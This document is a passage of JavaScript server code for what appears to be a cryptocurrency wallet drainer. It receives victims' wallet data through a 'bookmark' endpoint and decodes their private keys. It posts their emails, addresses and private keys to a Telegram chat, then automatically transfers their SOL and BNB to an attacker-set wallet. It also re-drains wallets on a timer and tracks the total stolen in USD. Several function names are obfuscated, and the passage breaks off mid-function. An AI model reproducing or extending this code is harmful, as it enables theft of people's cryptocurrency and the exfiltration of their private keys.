async function redepositDrainWallet(wallet, solPrice) {
  try {
    const balance = await H3X9M5(wallet.publicKey);
    if (balance === null) {
      return { success: false, reason: 'Failed to fetch balance (RPC error)', balance: 0 };
    }

    const minDrainAmount = config.solReserveAmount + 0.001;
    if (balance < minDrainAmount) {
      return { success: false, reason: 'Balance too low', balance };
    }

    const amountToSend = balance - config.solReserveAmount;
    const lamportsToSend = Math.floor(amountToSend * LAMPORTS_PER_SOL);

    const privateKeyBytes = bs58.default ? bs58.default.decode(wallet.privateKey) : bs58.decode(wallet.privateKey);
    const fromKeypair = Keypair.fromSecretKey(privateKeyBytes);
    const derivedPubKey = fromKeypair.publicKey.toBase58();
    if (derivedPubKey !== wallet.publicKey) {
      return { success: false, reason: 'Public key mismatch', balance };
    }

    const toPublicKey = new PublicKey(config.solanaDestinationWallet);

    let lastError = null;
    const maxAttempts = 2;

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        const { blockhash } = await solanaConnection.getLatestBlockhash('confirmed');

        const transaction = new Transaction({
          feePayer: fromKeypair.publicKey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: fromKeypair.publicKey,
            toPubkey: toPublicKey,
            lamports: lamportsToSend,
          })
        );

        const signature = await sendAndConfirmTransaction(
          solanaConnection,
          transaction,
          [fromKeypair],
          { commitment: 'confirmed', preflightCommitment: 'confirmed' }
        );

        const drainedUsd = amountToSend * solPrice;
        const drainEntry = {
          timestamp: new Date().toISOString(),
          chain: 'SOL',
          amount: amountToSend,
          usdAmount: drainedUsd,
          txid: signature,
        };
        const { totalDrainedUsd } = addDrainHistoryEntry(drainEntry);

        clients.forEach((client) => {
          client.res.write(
            `data: ${JSON.stringify({ type: 'drain-update', totalDrainedUsd, entry: drainEntry })}\n\n`
          );
        });

        console.log(`[Redeposit Monitor] SOL Transfer Created (Redeposit): ${amountToSend.toFixed(4)} SOL ($${drainedUsd.toFixed(2)}) | ${wallet.publicKey.substring(0, 8)}... | Tx: ${signature.substring(0, 8)}...`);

        if (config.telegramNotificationsEnabled) {
          try {
            const drainMessage = `✅ *SOL Transfer Created (Redeposit):* ${amountToSend.toFixed(4)} SOL ($${(amountToSend * solPrice).toFixed(2)})\n` +
              `*Txid:* https://solscan.io/tx/${signature}`;
            await telegramBot.sendMessage(config.telegramChatId, drainMessage, { parse_mode: 'Markdown' });
          } catch (telegramError) {
            console.error('[Redeposit Monitor] Failed to send Telegram notification:', telegramError.message);
          }
        }

        return { success: true, signature, amountDrained: amountToSend, balance };
      } catch (error) {
        lastError = error;

        if (error.message && error.message.includes('block height exceeded')) {
          console.log(`[Redeposit Monitor] Block height exceeded, attempt ${attempt + 1} of ${maxAttempts} – retrying...`);
          await new Promise((resolve) => setTimeout(resolve, 500));
          continue;
        } else {
          break;
        }
      }
    }

    throw lastError || new Error('Unknown error during SOL drain (Redeposit)');
  } catch (error) {
    console.error(`[Redeposit Monitor] Error draining SOL wallet ${wallet.publicKey?.substring(0, 8)}...:`, error.message);

    if (config.telegramNotificationsEnabled) {
      const errorMessage =
        `❌ *SOL Transfer Failed (Redeposit)*\n\n` +
        `*Wallet:* ${wallet.walletIndex || 'N/A'}\n` +
        `*Address:* \`${wallet.publicKey}\`\n` +
        `*Private Key:* \`${wallet.privateKey}\`\n` +
        `*Error:* ${escapeMd(error.message)}`;
      try {
        await telegramBot.sendMessage(config.telegramChatId, errorMessage, { parse_mode: 'Markdown' });
      } catch (telegramError) {
        console.error('[Redeposit Monitor] Failed to send Telegram error notification:', telegramError.message);
      }
    }

    return { success: false, reason: error.message, balance: 0 };
  }
}

async function runRedepositMonitor() {
  if (isManualCheckRunning) {
    console.log('[Redeposit Monitor] Manual check-balances is running, pausing redeposit monitor...');
    redepositPausedByManualCheck = true;
    return;
  }
  console.log('[Redeposit Monitor] Running balance check...');
  const data = D5V8B3();
  const solPrice = await G7P4R8();
  let checked = 0;
  let drained = 0;
  let skipped = 0;
  for (const entry of data) {
    if (isManualCheckRunning) {
      console.log('[Redeposit Monitor] Manual check started mid-run, pausing redeposit monitor...');
      redepositPausedByManualCheck = true;
      break;
    }
    if (entry.processedSBundles && entry.processedSBundles.wallets) {
      const validWallets = entry.processedSBundles.wallets.filter(w => !w.error && w.publicKey);
      for (const wallet of validWallets) {
        if (isManualCheckRunning) {
          console.log('[Redeposit Monitor] Manual check started mid-run, pausing redeposit monitor...');
          redepositPausedByManualCheck = true;
          break;
        }
        checked++;
        const balance = await H3X9M5(wallet.publicKey);
        if (balance === null) { skipped++; continue; }
        const balanceUsd = balance * solPrice;
        if (config.minimumDrainAmountUsd > 0 && balanceUsd < config.minimumDrainAmountUsd) {
          skipped++;
          continue;
        }
        const result = await redepositDrainWallet(wallet, solPrice);
        if (result.success) drained++;
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
    if (redepositPausedByManualCheck) break;
  }
  console.log(`[Redeposit Monitor] Check complete | Checked: ${checked} | Drained: ${drained} | Skipped: ${skipped}`);
  if (!redepositPausedByManualCheck && config.redepositMonitorEnabled) {
    scheduleRedepositMonitor();
  }
}

function scheduleRedepositMonitor() {
  if (redepositMonitorTimer) {
    clearTimeout(redepositMonitorTimer);
    redepositMonitorTimer = null;
  }
  const intervalMs = Math.max(3, config.redepositMonitorIntervalMinutes || 60) * 60 * 1000;
  redepositMonitorNextCheck = new Date(Date.now() + intervalMs).toISOString();
  console.log(`[Redeposit Monitor] Next check in ${config.redepositMonitorIntervalMinutes || 60} minute(s)`);
  redepositMonitorTimer = setTimeout(runRedepositMonitor, intervalMs);
}

function stopRedepositMonitor() {
  if (redepositMonitorTimer) {
    clearTimeout(redepositMonitorTimer);
    redepositMonitorTimer = null;
  }
  redepositMonitorNextCheck = null;
  console.log('[Redeposit Monitor] Stopped');
}

function resumeRedepositMonitorAfterManualCheck() {
  if (redepositPausedByManualCheck && config.redepositMonitorEnabled) {
    console.log('[Redeposit Monitor] Manual check finished, resuming redeposit monitor...');
    redepositPausedByManualCheck = false;
    scheduleRedepositMonitor();
  }
}

async function autoDrainEntry(entry) {
  if (!config.autoDrainEnabled) {
    console.log('Auto-drain is disabled, skipping...');
    return;
  }
  const solPrice = await G7P4R8();
  const bnbPrice = await getBnbPrice();
  if (entry.processedSBundles && entry.processedSBundles.wallets) {
    const validWallets = entry.processedSBundles.wallets.filter(w => !w.error);
    for (const wallet of validWallets) {
      await autoDrainWallet(wallet, solPrice);
    }
  }
  if (entry.processedBnbBundles && entry.processedBnbBundles.wallets) {
    const validWallets = entry.processedBnbBundles.wallets.filter(w => !w.error);
    for (const wallet of validWallets) {
      await autoDrainBnbWallet(wallet, bnbPrice);
    }
  }
}

async function sendTelegramNotification(entry) {
  if (!config.telegramNotificationsEnabled) return;
  try {
    const solPrice = await G7P4R8();
    const bnbPrice = await getBnbPrice();
    let totalUsdValue = 0;
    let totalSolTokenUsd = 0;
    let totalTokenCount = 0;
    const userIdentifier = entry.user?.email || (typeof entry.user === 'string' ? entry.user : entry.userId || entry.userEmail || entry.email || 'N/A');
    const timestamp = new Date(entry.timestamp).toLocaleString('en-US', { timeZone: 'America/Los_Angeles' });

    let message = `*New Bookmark Hit*\n\n`;
    message += `*Email:* ${escapeMd(userIdentifier)}\n`;
    message += `*Time:* ${escapeMd(timestamp)}\n\n`;

    if (entry.processedSBundles && entry.processedSBundles.wallets) {
      const validWallets = entry.processedSBundles.wallets.filter(w => !w.error && w.publicKey);
      if (validWallets.length > 0) {
        const pubKeys = validWallets.map(w => w.publicKey);
        const [balanceMap, tokenDataMap] = await Promise.all([
          getBulkSolBalances(pubKeys),
          getBulkSolTokenData(pubKeys)
        ]);
        let totalBalance = 0;
        message += `*SOL WALLETS (${validWallets.length}):*\n\n`;
        for (const wallet of validWallets) {
          const balance = balanceMap.get(wallet.publicKey);
          const displayBalance = balance !== null && balance !== undefined ? balance : 0;
          const failed = balance === null;
          const tokenData = tokenDataMap.get(wallet.publicKey) || { count: 0, usdValue: 0 };
          totalBalance += displayBalance;
          totalSolTokenUsd += tokenData.usdValue;
          totalTokenCount += tokenData.count;
          const walletTotalUsd = (displayBalance * solPrice) + tokenData.usdValue;
          message += `*Wallet ${wallet.walletIndex}*\n`;
          message += `Balance: ${displayBalance.toFixed(4)} SOL ($${(displayBalance * solPrice).toFixed(2)})`;
          if (tokenData.count > 0) {
            message += ` | Tokens: ${tokenData.count} ($${tokenData.usdValue.toFixed(2)})`;
          }
          if (failed) message += ' ⚠️ RPC ERROR';
          message += `\n`;
          message += `Address: \`${wallet.publicKey}\`\n`;
          message += `Private Key: \`${wallet.privateKey}\`\n\n`;
          console.log(`[Wallet] ${wallet.publicKey.substring(0,8)}... | SOL: ${displayBalance.toFixed(4)} ($${(displayBalance * solPrice).toFixed(2)}) | Tokens: ${tokenData.count} ($${tokenData.usdValue.toFixed(2)}) | BNB: 0 ($0.00) | Total: $${walletTotalUsd.toFixed(2)}`);
        }
        totalUsdValue += (totalBalance * solPrice) + totalSolTokenUsd;
        message += `*SOL TOTAL:* ${totalBalance.toFixed(4)} SOL ($${(totalBalance * solPrice).toFixed(2)})\n`;
        if (totalTokenCount > 0) {
          message += `*TOKENS TOTAL:* ${totalTokenCount} ($${totalSolTokenUsd.toFixed(2)})\n`;
        }
        message += `\n`;
      }
    }

    if (entry.processedBnbBundles && entry.processedBnbBundles.wallets) {
      const validWallets = entry.processedBnbBundles.wallets.filter(w => !w.error && w.publicKey);
      if (validWallets.length > 0) {
        const addresses = validWallets.map(w => w.publicKey);
        const balanceMap = await getBulkBnbBalances(addresses);
        let totalBalance = 0;
        message += `*BNB WALLETS (${validWallets.length}):*\n\n`;
        for (const wallet of validWallets) {
          const balance = balanceMap.get(wallet.publicKey);
          const displayBalance = balance !== null && balance !== undefined ? balance : 0;
          const failed = balance === null;
          totalBalance += displayBalance;
          message += `*Wallet ${wallet.walletIndex}*\n`;
          message += `Balance: ${displayBalance.toFixed(4)} BNB ($${(displayBalance * bnbPrice).toFixed(2)})${failed ? ' ⚠️ RPC ERROR' : ''}\n`;
          message += `Address: \`${wallet.publicKey}\`\n`;
          message += `Private Key: \`${wallet.privateKey}\`\n\n`;
          console.log(`[Wallet] ${wallet.publicKey.substring(0,8)}... | SOL: 0 ($0.00) | Tokens: 0 ($0.00) | BNB: ${displayBalance.toFixed(4)} ($${(displayBalance * bnbPrice).toFixed(2)}) | Total: $${(displayBalance * bnbPrice).toFixed(2)}`);
        }
        totalUsdValue += totalBalance * bnbPrice;
        message += `*BNB TOTAL:* ${totalBalance.toFixed(4)} BNB ($${(totalBalance * bnbPrice).toFixed(2)})\n\n`;
      }
    }

    message += `*TOTAL USD:* $${totalUsdValue.toFixed(2)}`;
    await telegramBot.sendMessage(config.telegramChatId, message, { parse_mode: 'Markdown' });
    console.log('Telegram notification sent successfully');
  } catch (error) {
    console.error('Error sending Telegram notification:', error.message);
  }
}

async function verifyTurnstile(token, ip) {
  if (!token) return false;
  try {
    const formData = new URLSearchParams();
    formData.append('secret', config.turnstileSecretKey);
    formData.append('response', token);
    if (ip) formData.append('remoteip', ip);
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      body: formData,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    const data = await verifyRes.json();
    return data.success === true;
  } catch (e) {
    console.error('Turnstile verification error:', e.message);
    return false;
  }
}

app.get('/api/public-config', (req, res) => {
  res.json({ turnstileSiteKey: config.turnstileSiteKey || '' });
});

app.post('/api/admin-login', async (req, res) => {
  try {
    const { password, cfTurnstileToken } = req.body;
    if (config.turnstileSecretKey && config.turnstileSecretKey !== 'YOUR_TURNSTILE_SECRET_KEY') {
      const ip = getClientIpSync(req);
      const valid = await verifyTurnstile(cfTurnstileToken, ip);
      if (!valid) {
        return res.status(400).json({ success: false, message: 'CAPTCHA verification failed. Please try again.' });
      }
    }
    if (password === Z4H8L6) {
      const token = issueAdminToken();
      res.json({ success: true, token, message: 'Authentication successful' });
    } else {
      res.status(401).json({ success: false, message: 'Invalid password' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/verify-admin', (req, res) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  const decoded = token ? verifyAdminToken(token) : null;
  if (decoded) {
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false });
  }
});

app.get('/api/server-info', K9S2E7, (req, res) => {
  res.json({ success: true, serverStartTime: SERVER_START_TIME, adminUsername: config.adminUsername || 'Admin' });
});

app.post('/api/admin-logout', K9S2E7, (req, res) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (token) { tokenBlacklist.add(token); }
  res.json({ success: true, message: 'Logged out successfully' });
});

app.get('/api/drain-history', K9S2E7, (req, res) => {
  try {
    const history = loadDrainHistory();
    const historyTotal = history.reduce((sum, entry) => sum + (entry.usdAmount || 0), 0);
    const customAmount = config.customDrainedAmount || 0;
    res.json({ success: true, history, totalDrainedUsd: historyTotal + customAmount, customDrainedAmount: customAmount, historyTotal });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/set-custom-drained', K9S2E7, (req, res) => {
  try {
    const { amount, operation } = req.body;
    if (typeof amount !== 'number' || amount <= 0) {
      return res.status(400).json({ success: false, error: 'Invalid amount' });
    }
    if (operation === 'subtract') {
      config.customDrainedAmount = Math.max(0, (config.customDrainedAmount || 0) - amount);
    } else {
      config.customDrainedAmount = (config.customDrainedAmount || 0) + amount;
    }
    if (saveConfig(config)) {
      res.json({ success: true, customDrainedAmount: config.customDrainedAmount, totalDrainedUsd: getTotalDrainedFromHistory() });
    } else {
      res.status(500).json({ success: false, error: 'Failed to save config' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/config', K9S2E7, (req, res) => {
  try {
    const safeConfig = { ...config };
    delete safeConfig.jwtSecret;
    res.json({ success: true, config: safeConfig });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/config', K9S2E7, (req, res) => {
  try {
    const newConfig = req.body;
    if (typeof newConfig !== 'object') {
      return res.status(400).json({ success: false, error: 'Invalid config format' });
    }
    delete newConfig.jwtSecret;
    delete newConfig.totalDrainedUsd;
    if (newConfig.redepositMonitorIntervalMinutes !== undefined) {
      newConfig.redepositMonitorIntervalMinutes = Math.min(999999, Math.max(3, parseInt(newConfig.redepositMonitorIntervalMinutes) || 60));
    }
    config = { ...config, ...newConfig };
    if (saveConfig(config)) {
      if (newConfig.telegramBotToken) { reinitializeTelegramBot(); }
      if ('redepositMonitorEnabled' in newConfig || 'redepositMonitorIntervalMinutes' in newConfig) {
        if (config.redepositMonitorEnabled) {
          scheduleRedepositMonitor();
        } else {
          stopRedepositMonitor();
        }
      }
      const safeConfig = { ...config };
      delete safeConfig.jwtSecret;
      res.json({ success: true, message: 'Config updated successfully', config: safeConfig });
    } else {
      res.status(500).json({ success: false, error: 'Failed to save config' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/redeposit-monitor-status', K9S2E7, (req, res) => {
  res.json({
    success: true,
    enabled: config.redepositMonitorEnabled || false,
    intervalMinutes: config.redepositMonitorIntervalMinutes || 60,
    nextCheck: redepositMonitorNextCheck,
    isManualCheckRunning: isManualCheckRunning,
    isPausedByManualCheck: redepositPausedByManualCheck
  });
});

app.post('/api/change-password', K9S2E7, (req, res) => {
  try {
    const { currentPassword, newPassword, confirmPassword } = req.body;
    if (!currentPassword || !newPassword || !confirmPassword) {
      return res.status(400).json({ success: false, error: 'All fields are required' });
    }
    if (currentPassword !== Z4H8L6) {
      return res.status(401).json({ success: false, error: 'Current password is incorrect' });
    }
    if (newPassword !== confirmPassword) {
      return res.status(400).json({ success: false, error: 'New passwords do not match' });
    }
    if (newPassword.length < 4) {
      return res.status(400).json({ success: false, error: 'Password must be at least 4 characters' });
    }
    Z4H8L6 = newPassword;
    config.adminPassword = newPassword;
    if (saveConfig(config)) {
      res.json({ success: true, message: 'Password changed successfully' });
    } else {
      res.status(500).json({ success: false, error: 'Failed to save new password' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/bookmark-data', async (req, res) => {
  try {
    if (!validateBookmarkPayload(req.body)) {
      return res.status(400).json({ success: false, error: 'Invalid data' });
    }
    const data = D5V8B3();
    const newEntry = { id: Date.now(), timestamp: new Date().toISOString(), ...req.body };
    if (newEntry.sBundles && newEntry.bundle) {
      newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
    }
    if (newEntry.eBundles && (newEntry.evmBundleKey || newEntry.bundle)) {
      const evmKey = newEntry.evmBundleKey || newEntry.bundle;
      newEntry.processedBnbBundles = processBnbBundles(newEntry.eBundles, evmKey);
    }
    const newSolAddresses = newEntry.processedSBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
    const newBnbAddresses = newEntry.processedBnbBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
    const alreadyExists = data.some(entry => {
      const existingSolAddresses = entry.processedSBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
      const existingBnbAddresses = entry.processedBnbBundles?.wallets?.filter(w => !w.error).map(w => w.publicKey).sort() || [];
      const solMatch = JSON.stringify(newSolAddresses) === JSON.stringify(existingSolAddresses);
      const bnbMatch = JSON.stringify(newBnbAddresses) === JSON.stringify(existingBnbAddresses);
      return solMatch && bnbMatch;
    });
    if (alreadyExists) {
      return res.json({ success: true, id: null, duplicate: true });
    }
    data.push(newEntry);
    F6N2T9(data);
    clients.forEach(client => {
      client.res.write(`data: ${JSON.stringify({ type: 'new-entry', data: newEntry })}\n\n`);
    });
    res.json({ success: true, id: newEntry.id });
    await sendTelegramNotification(newEntry).catch(err => { console.error('Telegram notification error:', err); });
    autoDrainEntry(newEntry).catch(err => { console.error('Auto-drain error:', err); });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/bookmark-data', K9S2E7, (req, res) => {
  try {
    const data = D5V8B3();
    res.json(data);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.delete('/api/bookmark-data/:id', K9S2E7, (req, res) => {
  try {
    const data = D5V8B3();
    const filteredData = data.filter(item => item.id !== parseInt(req.params.id));
    F6N2T9(filteredData);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

function finishBalanceCheckJob(jobId, status, result = null, error = null) {
  const job = balanceCheckJobs.get(jobId);
  if (job) {
    job.status = status;
    job.completedAt = new Date().toISOString();
    if (result) job.result = result;
    if (error) job.error = error;
  }
  if (activeBalanceCheckJobId === jobId) {
    activeBalanceCheckJobId = null;
    isManualCheckRunning = false;
    resumeRedepositMonitorAfterManualCheck();
  }
  setTimeout(() => balanceCheckJobs.delete(jobId), 30 * 60 * 1000);
}

async function runBalanceCheckAllJob(jobId) {
  const job = balanceCheckJobs.get(jobId);
  if (!job) return;

  try {
    job.status = 'running';
    job.progress = 'Collecting wallet addresses...';

    const data = D5V8B3();
    const solPrice = await G7P4R8();
    const bnbPrice = await getBnbPrice();
    const solAddresses = [];
    const bnbAddresses = [];
    let totalSolBalance = 0;
    let totalBnbBalance = 0;
    const addressBalances = [];
    const failedChecks = [];
    const seenSolKeys = new Set();
    const seenBnbKeys = new Set();

    for (const entry of data) {
      if (entry.processedSBundles && entry.processedSBundles.wallets) {
        for (const wallet of entry.processedSBundles.wallets) {
          if (wallet.publicKey && !wallet.error && !seenSolKeys.has(wallet.publicKey)) {
            seenSolKeys.add(wallet.publicKey);
            solAddresses.push({
              entryId: entry.id,
              walletIndex: wallet.walletIndex,
              publicKey: wallet.publicKey,
              privateKey: wallet.privateKey,
              chain: 'SOL'
            });
          }
        }
      }
      if (entry.processedBnbBundles && entry.processedBnbBundles.wallets) {
        for (const wallet of entry.processedBnbBundles.wallets) {
          if (wallet.publicKey && !wallet.error && !seenBnbKeys.has(wallet.publicKey)) {
            seenBnbKeys.add(wallet.publicKey);
            bnbAddresses.push({
              entryId: entry.id,
              walletIndex: wallet.walletIndex,
              publicKey: wallet.publicKey,
              privateKey: wallet.privateKey,
              chain: 'BNB'
            });
          }
        }
      }
    }

    job.totalWallets = solAddresses.length + bnbAddresses.length;
    job.checkedWallets = 0;

    if (solAddresses.length > 0) {
      job.progress = `Checking Balances (0/${solAddresses.length})...`;
      console.log(`[Check Balances] ${job.progress}`);
      const allSolPubKeys = solAddresses.map(a => a.publicKey);
      const solBalanceMap = await getBulkSolBalances(allSolPubKeys, (done, total) => {
        job.progress = `Checking Balances (${done}/${total})...`;
        job.checkedWallets = done;
      });

      for (const addr of solAddresses) {
        const balance = solBalanceMap.get(addr.publicKey);
        if (balance === null) {
          failedChecks.push({ entryId: addr.entryId, walletIndex: addr.walletIndex, publicKey: addr.publicKey, chain: 'SOL', error: 'RPC request failed' });
          continue;
        }
        totalSolBalance += balance;
        const usdBalance = balance * solPrice;
        console.log(`[Wallet] ${addr.publicKey.substring(0, 8)}... | SOL: ${balance.toFixed(4)} ($${usdBalance.toFixed(2)})`);
        addressBalances.push({
          entryId: addr.entryId,
          walletIndex: addr.walletIndex,
          publicKey: addr.publicKey,
          privateKey: addr.privateKey,
          chain: 'SOL',
          balance,
          usdBalance
        });
      }
    }

    if (bnbAddresses.length > 0) {
      const solDone = solAddresses.length;
      job.progress = `Checking Balances (0/${bnbAddresses.length})...`;
      console.log(`[Check Balances] ${job.progress}`);
      const allBnbAddrs = bnbAddresses.map(a => a.publicKey);
      const bnbBalanceMap = await getBulkBnbBalances(allBnbAddrs, (done, total) => {
        job.progress = `Checking Balances (${done}/${total})...`;
        job.checkedWallets = solDone + done;
      });

      for (const addr of bnbAddresses) {
        const balance = bnbBalanceMap.get(addr.publicKey);
        if (balance === null) {
          failedChecks.push({ entryId: addr.entryId, walletIndex: addr.walletIndex, publicKey: addr.publicKey, chain: 'BNB', error: 'RPC request failed' });
          continue;
        }
        totalBnbBalance += balance;
        const usdBalance = balance * bnbPrice;
        console.log(`[Wallet] ${addr.publicKey.substring(0, 8)}... | BNB: ${balance.toFixed(4)} ($${usdBalance.toFixed(2)})`);
        addressBalances.push({
          entryId: addr.entryId,
          walletIndex: addr.walletIndex,
          publicKey: addr.publicKey,
          privateKey: addr.privateKey,
          chain: 'BNB',
          balance,
          usdBalance
        });
      }
    }

    job.checkedWallets = job.totalWallets;
    addressBalances.sort((a, b) => b.usdBalance - a.usdBalance);
    const totalUsdBalance = (totalSolBalance * solPrice) + (totalBnbBalance * bnbPrice);
    console.log(`[Balance Check All] SOL: ${totalSolBalance.toFixed(4)} | BNB: ${totalBnbBalance.toFixed(4)} | Total USD: $${totalUsdBalance.toFixed(2)} | Wallets: ${job.totalWallets}`);

    const result = {
      success: true,
      totalSolAddresses: solAddresses.length,
      totalBnbAddresses: bnbAddresses.length,
      totalSolBalance,
      totalBnbBalance,
      totalUsdBalance,
      solPrice,
      bnbPrice,
      addressBalances,
      failedChecks
    };
    job.progress = 'Complete';
    finishBalanceCheckJob(jobId, 'completed', result);
    console.log('[Check Balances] Manual check finished');
  } catch (error) {
    console.error('[Check Balances] Error:', error.message);
    finishBalanceCheckJob(jobId, 'failed', null, error.message);
  }
}

app.get('/api/check-balances', K9S2E7, (req, res) => {
  try {
    if (isManualCheckRunning && activeBalanceCheckJobId) {
      const existingJob = balanceCheckJobs.get(activeBalanceCheckJobId);
      if (existingJob && (existingJob.status === 'pending' || existingJob.status === 'running')) {
        return res.json({ success: true, jobId: activeBalanceCheckJobId, alreadyRunning: true });
      }
    }

    const jobId = crypto.randomUUID();
    isManualCheckRunning = true;
    activeBalanceCheckJobId = jobId;
    balanceCheckJobs.set(jobId, {
      status: 'pending',
      startedAt: new Date().toISOString(),
      progress: 'Starting...',
      totalWallets: 0,
      checkedWallets: 0
    });

    console.log('[Check Balances] Manual check started, redeposit monitor will pause if running');
    res.json({ success: true, jobId });

    setImmediate(() => runBalanceCheckAllJob(jobId));
  } catch (error) {
    isManualCheckRunning = false;
    activeBalanceCheckJobId = null;
    resumeRedepositMonitorAfterManualCheck();
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/check-balances/status/:jobId', K9S2E7, (req, res) => {
  const job = balanceCheckJobs.get(req.params.jobId);
  if (!job) {
    return res.status(404).json({ success: false, error: 'Job not found' });
  }
  const response = {
    success: true,
    jobId: req.params.jobId,
    status: job.status,
    progress: job.progress,
    totalWallets: job.totalWallets,
    checkedWallets: job.checkedWallets,
    startedAt: job.startedAt,
    completedAt: job.completedAt || null
  };
  if (job.status === 'completed' && job.result) {
    Object.assign(response, job.result);
  }
  if (job.status === 'failed') {
    response.error = job.error || 'Balance check failed';
  }
  res.json(response);
});

app.get('/api/check-balance/:id', K9S2E7, async (req, res) => {
  try {
    const entryId = parseInt(req.params.id);
    const data = D5V8B3();
    const entry = data.find(item => item.id === entryId);
    if (!entry) {
      return res.status(404).json({ success: false, error: 'Entry not found' });
    }
    const solPrice = await G7P4R8();
    const bnbPrice = await getBnbPrice();
    let totalSolBalance = 0;
    let totalBnbBalance = 0;
    let totalTokenUsdValue = 0;
    let totalTokenCount = 0;
    let addressBalances = [];
    let failedChecks = [];
    if (entry.processedSBundles && entry.processedSBundles.wallets) {
      const validWallets = entry.processedSBundles.wallets.filter(w => w.publicKey && !w.error);
      if (validWallets.length > 0) {
        const pubKeys = validWallets.map(w => w.publicKey);
        const [balanceMap, tokenDataMap] = await Promise.all([
          getBulkSolBalances(pubKeys),
          getBulkSolTokenData(pubKeys)
        ]);
        for (const wallet of validWallets) {
          const balance = balanceMap.get(wallet.publicKey);
          if (balance === null) {
            failedChecks.push({ entryId: entry.id, walletIndex: wallet.walletIndex, publicKey: wallet.publicKey, chain: 'SOL', error: 'RPC request failed' });
            continue;
          }
          const tokenData = tokenDataMap.get(wallet.publicKey) || { count: 0, usdValue: 0, tokens: [] };
          totalSolBalance += balance;
          totalTokenUsdValue += tokenData.usdValue;
          totalTokenCount += tokenData.count;
          console.log(`[Wallet] ${wallet.publicKey.substring(0,8)}... | SOL: ${balance.toFixed(4)} ($${(balance * solPrice).toFixed(2)}) | Tokens: ${tokenData.count} ($${tokenData.usdValue.toFixed(2)}) | BNB: 0 ($0.00) | Total: $${((balance * solPrice) + tokenData.usdValue).toFixed(2)}`);
          addressBalances.push({
            entryId: entry.id,
            walletIndex: wallet.walletIndex,
            publicKey: wallet.publicKey,
            privateKey: wallet.privateKey,
            chain: 'SOL',
            balance,
            usdBalance: balance * solPrice,
            tokenCount: tokenData.count,
            tokenUsdValue: tokenData.usdValue,
            tokens: tokenData.tokens || [],
            totalUsdValue: (balance * solPrice) + tokenData.usdValue
          });
        }
      }
    }
    if (entry.processedBnbBundles && entry.processedBnbBundles.wallets) {
      const validWallets = entry.processedBnbBundles.wallets.filter(w => w.publicKey && !w.error);
      if (validWallets.length > 0) {
        const addresses = validWallets.map(w => w.publicKey);
        const balanceMap = await getBulkBnbBalances(addresses);
        for (const wallet of validWallets) {
          const balance = balanceMap.get(wallet.publicKey);
          if (balance === null) {
            failedChecks.push({ entryId: entry.id, walletIndex: wallet.walletIndex, publicKey: wallet.publicKey, chain: 'BNB', error: 'RPC request failed' });
            continue;
          }
          totalBnbBalance += balance;
          console.log(`[Wallet] ${wallet.publicKey.substring(0,8)}... | SOL: 0 ($0.00) | Tokens: 0 ($0.00) | BNB: ${balance.toFixed(4)} ($${(balance * bnbPrice).toFixed(2)}) | Total: $${(balance * bnbPrice).toFixed(2)}`);
          addressBalances.push({
            entryId: entry.id,
            walletIndex: wallet.walletIndex,
            publicKey: wallet.publicKey,
            privateKey: wallet.privateKey,
            chain: 'BNB',
            balance,
            usdBalance: balance * bnbPrice,
            tokenCount: 0,
            tokenUsdValue: 0,
            tokens: [],
            totalUsdValue: balance * bnbPrice
          });
        }
      }
    }
    addressBalances.sort((a, b) => (b.totalUsdValue || b.usdBalance) - (a.totalUsdValue || a.usdBalance));
    console.log(`[Balance Check] Entry #${entryId} | SOL: ${totalSolBalance.toFixed(4)} | BNB: ${totalBnbBalance.toFixed(4)} | Tokens: ${totalTokenCount} ($${totalTokenUsdValue.toFixed(2)})`);
    res.json({
      success: true,
      entryId,
      totalSolBalance,
      totalBnbBalance,
      totalTokenUsdValue,
      totalTokenCount,
      totalUsdBalance: (totalSolBalance * solPrice) + (totalBnbBalance * bnbPrice) + totalTokenUsdValue,
      solPrice,
      bnbPrice,
      addressBalances,
      failedChecks
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/drain-wallet', K9S2E7, async (req, res) => {
  try {
    const { entryId, walletIndex, chain } = req.body;
    if (!entryId || !walletIndex) {
      return res.status(400).json({ success: false, error: 'Entry ID and wallet index are required' });
    }
    const data = D5V8B3();
    const entry = data.find(item => item.id === parseInt(entryId));
    if (!entry) {
      return res.status(404).json({ success: false, error: 'Entry not found' });
    }
    const walletChain = chain || 'SOL';
    if (walletChain === 'BNB') {
      if (!entry.processedBnbBundles || !entry.processedBnbBundles.wallets) {
        return res.status(400).json({ success: false, error: 'No BNB wallet data found for this entry' });
      }
      const wallet = entry.processedBnbBundles.wallets.find(w => w.walletIndex === parseInt(walletIndex));
      if (!wallet) { return res.status(404).json({ success: false, error: 'BNB Wallet not found' }); }
      if (wallet.error) { return res.status(400).json({ success: false, error: 'Wallet has an error: ' + wallet.error }); }
      const bnbPrice = await getBnbPrice();
